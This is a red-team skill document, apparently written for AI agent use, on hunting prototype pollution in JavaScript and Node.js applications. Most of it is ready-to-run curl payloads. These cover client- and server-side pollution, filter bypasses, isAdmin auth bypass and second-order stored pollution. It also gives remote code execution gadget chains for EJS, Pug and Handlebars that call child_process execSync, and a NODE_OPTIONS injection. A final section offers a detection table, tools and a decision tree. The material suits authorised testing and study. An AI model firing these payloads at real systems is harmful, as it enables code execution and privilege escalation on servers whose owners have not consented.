---
name: hunt-prototype-pollution
description: Hunt client-side and server-side prototype pollution for XSS, auth bypass, and RCE.
category: redteam
version: 1.0.0
author: uphiago
license: MIT
platforms: [linux]
compatibility: Requires curl, python3, node
metadata:
  tags: [redteam, prototype-pollution, XSS, RCE, JavaScript, Node.js, jQuery]
  category: redteam
  related_skills:
    - hunt-nodejs
    - hunt-xss
    - hunt-api-misconfig
---

# Prototype Pollution Hunting

Hunt for prototype pollution vulnerabilities where user-supplied properties merge into `Object.prototype`, affecting all objects in the runtime. Client-side pollution enables DOM XSS, cookie manipulation, and auth bypass. Server-side pollution chains to RCE via gadget chains in template engines (EJS, Pug, Handlebars) and CLI wrappers (child_process, NODE_OPTIONS).

## When to Use

- Application uses JavaScript/Node.js with object merge, clone, or extend operations on user input.
- jQuery `$.extend(true, ...)` or `$.fn.merge()` with deep copy on untrusted data.
- Lodash `_.merge()`, `_.defaultsDeep()`, `_.set()` receiving request body/query params.
- Template engines (EJS, Pug, Handlebars) in the same runtime as user-controlled objects.
- Server-side Node.js with `child_process.exec`/`spawn` accessible via polluted options.

## Quick Detection

```bash
# client-side: pollute via query param
curl -sk "https://target.com/page?__proto__[polluted]=true"

# server-side: pollute via JSON body
curl -sk -X POST "https://target.com/api/config" \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"isAdmin":true}}'
```

## Procedure

### Phase 1 — Client-Side Pollution Vectors

```bash
# URL query string
https://target.com/?__proto__[test]=polluted
https://target.com/?constructor[prototype][test]=polluted

# JSON body in API
curl -sk -X POST "https://target.com/api/data" \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"polluted":"yes"}}'

# Form-encoded
curl -sk -X POST "https://target.com/form" \
  -d '__proto__[polluted]=true'

# Via Object.assign / spread in request handlers
curl -sk -X PATCH "https://target.com/api/settings" \
  -H "Content-Type: application/json" \
  -d '{"constructor":{"prototype":{"isAdmin":true}}}'
```

### Phase 2 — Server-Side RCE via Gadget Chains

**EJS RCE (outputFunctionName):**
```bash
curl -sk -X POST "https://target.com/api/render" \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"outputFunctionName":"_tmp;global.process.mainModule.require(\"child_process\").execSync(\"id\");"}}'
```

**Pug RCE (self.block):**
```bash
curl -sk -X POST "https://target.com/api/preferences" \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"block":{"type":"Text","line":"process.mainModule.require(\"child_process\").execSync(\"id\")"}}}'
```

**Handlebars RCE (compileFunction):**
```bash
curl -sk -X PUT "https://target.com/api/profile" \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"precompileOptions":{"knownHelpersOnly":false,"compat":true},"compileFunction":"return process.mainModule.require(\"child_process\").execSync(\"id\").toString();"}}'
```

**NODE_OPTIONS injection:**
```bash
curl -sk -X POST "https://target.com/api/task" \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"NODE_OPTIONS":"--require /proc/self/environ","shell":"/bin/sh","env":{"NODE_DEBUG":"test"}}}'
```

### Phase 3 — Filter Bypass Techniques

```bash
# Unicode normalization (e.g., ä → a)
https://target.com/?__proto__[test]=1         # blocked
https://target.com/?__pröto__[test]=1         # bypass (ä normalizes to a)

# constructor.prototype path
curl -sk -X POST "https://target.com/api/data" \
  -d '{"constructor":{"prototype":{"polluted":true}}}'

# Array pollution (lodash specific)
curl -sk -X POST "https://target.com/api/data" \
  -d '{"__proto__":{"polluted":[]}}'  # forces array coercion

# ppfuzz — automated prototype pollution scanner
ppfuzz -u https://target.com/api/merge -m POST -H "Content-Type: application/json"
```

### Phase 4 — Client-Side Exploitation

```javascript
// Verify pollution in browser console
Object.prototype.polluted  // should return the injected value

// DOM XSS via polluted options
// If the app uses jQuery $.extend with polluted {url: "javascript:alert(1)"}

// Auth bypass: pollute isAdmin
// If the app checks if (user.isAdmin) without hasOwnProperty
```

### Phase 5 — Second-Order Pollution

```bash
# Store pollution in database, triggered by background job
curl -sk -X POST "https://target.com/api/profile" \
  -H "Content-Type: application/json" \
  -d '{"name":{"__proto__":{"isAdmin":true}}}'

# Later, when an admin views the profile or a cron job processes it,
# the pollution triggers in that context
```

## Pitfalls

- **Not every `__proto__` in a request is a finding.** Only report when the polluted property actually affects application behavior.
- **Node.js 12+ and newer lodash versions have partial mitigations.** Test with older versions first.
- **Server-side pollution requires a gadget.** Polluting random objects without reaching a sink (exec, eval, template) has no impact.
- **BlackFan's client-side prototype pollution catalog** is the canonical reference — cross-check findings against it.

## Verification

1. Inject `__proto__[test]=value` and verify `Object.prototype.test === value` in browser console or server response.
2. For RCE: confirm command execution produces output (id/whoami) in a visible sink.
3. For XSS: verify the polluted property reaches `innerHTML`, `eval`, `document.write`, or a script `src` attribute.
4. Document the exact merge/copy function and the polluted property chain.

## Related Skills

- **`hunt-nodejs`** — Node.js-specific vulnerabilities including prototype pollution in Express/Next.js.
- **`hunt-xss`** — DOM XSS often exploitable through client-side prototype pollution.
- **`hunt-api-misconfig`** — Object merge on request bodies without `hasOwnProperty` checks.

## Advanced Technical Reference (from prototype-pollution-playbook)

### Mechanism: `__proto__` vs `constructor.prototype`

**`__proto__`**: Many parsers treat the literal key `__proto__` as a magic key that attaches nested properties to the prototype chain. Merging `{"__proto__": {"x": 1}}` may be equivalent to `Object.prototype.x = 1` (behavior varies by implementation and version).

**`constructor.prototype`**: `constructor` typically points to the object's constructor; `constructor.prototype` targets that constructor's `prototype` object. For plain objects this defaults to `Object.prototype`. Path: `{"constructor":{"prototype":{"polluted":1}}}`. Not always equivalent to `__proto__` (filtering, JSON.parse, Bun/Node differences) — **always test both**.

**Attack essence**: In an un-isolated merge algorithm, attacker-controlled keys reach the prototype object, giving **global** or **shared** template contexts malicious properties. Subsequent code "normally" reads these properties and triggers gadgets.

### Server-Side Detection Table (Express/Node, Black-Box)

Assumes body/query is deeply parsed by `qs` or equivalent. Observe **global side effects**:

| Payload (JSON) | Expected Observable Signal |
|---|---|
| `{"__proto__":{"parameterLimit":1}}` | Subsequent requests with multiple params are ignored or parse abnormally |
| `{"__proto__":{"ignoreQueryPrefix":true}}` | `??foo=bar` double-prefix accepted or behavior changes |
| `{"__proto__":{"allowDots":true}}` | `?foo.bar=baz` nested-key dot expansion takes effect |
| `{"__proto__":{"json spaces":" "}}` | JSON serialization responses show extra spaces (`JSON.stringify` polluted) |
| `{"__proto__":{"exposedHeaders":["foo"]}}` | CORS responses include `foo`-related headers |
| `{"__proto__":{"status":510}}` | A response status code changes to 510 or anomalous code |

Operational: send pollution request first, then a **clean** follow-up request to check persistence. Connection pooling and worker lifecycle affect whether changes are globally visible.

### Tools

| Project | Purpose |
|---|---|
| **yeswehack/pp-finder** | Locate PP-prone merge points and patterns |
| **yuske/silent-spring** | Research and detect prototype pollution surfaces |
| **yuske/server-side-prototype-pollution** | Server-side PP test suite / methodology |
| **BlackFan/client-side-prototype-pollution** | Browser-side PP cases and payloads |
| **portswigger/server-side-prototype-pollution** | Burp ecosystem extension / supporting materials |
| **msrkp/PPScan** | Scanning / verification helper |
| **ppfuzz** | Automated prototype pollution fuzzer: `ppfuzz -u URL -m POST` |

### Decision Tree

```
                    Input merged into nested object?
                    (query, JSON, GraphQL vars, YAML→JSON)
                                |
               NO --------------+-------------- YES
               |                              |
        Other vuln class                Parser allows __proto__ /
                                        constructor.prototype keys?
                                                    |
                                    NO --------------+-------------- YES
                                    |                              |
                             Check unicode /                    Confirm global effect:
                             bypass of key names               clean follow-up request
                                    |                              |
                                    +--------------+----------------+
                                                   |
                                                   v
                                    Gadget present? (template, spawn, JSON.stringify opts, CORS)
                                                   |
                              NO ------------------+------------------ YES
                              |                                         |
                       Report PP as DoS /              Build minimal RCE or
                       logic impact                   high-impact PoC
                              |                                         |
                              +---------------------+-------------------+
                                                    |
                                                    v
                              Client-side: fragment / DOM / third-party script
                              Server-side: qs/body-parser/lodash/deep-merge version audit
```
